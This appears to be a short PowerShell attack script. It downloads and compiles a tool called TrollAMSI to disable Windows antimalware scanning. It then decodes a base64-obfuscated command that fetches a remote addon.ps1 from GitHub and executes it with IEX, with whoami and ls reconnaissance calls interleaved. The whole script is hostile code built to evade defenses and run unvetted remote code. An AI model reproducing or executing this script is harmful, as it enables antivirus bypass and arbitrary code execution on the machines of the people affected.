$code = (iwr https://raw.githubusercontent.com/cybersectroll/TrollAMSI/main/TrollAMSI.cs).content
Add-Type $code
[TrollAMSI]::troll()

$patata_detective = "SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AagBhAG0AYwAtAGMAbwBuAHQAcgBhAGMAdABvAHIALwBwAHIAdQBlAGIAYQAvAG0AYQBpAG4ALwBhAGQAZABvAG4ALgBwAHMAMQAgAHwAIABpAGUAeAA="
whoami
$patata_sin_capa = [Convert]::FromBase64String($patata_detective)
ls
$patata_descubierta = [System.Text.Encoding]::Unicode.GetString($patata_sin_capa)

IEX $patata_descubierta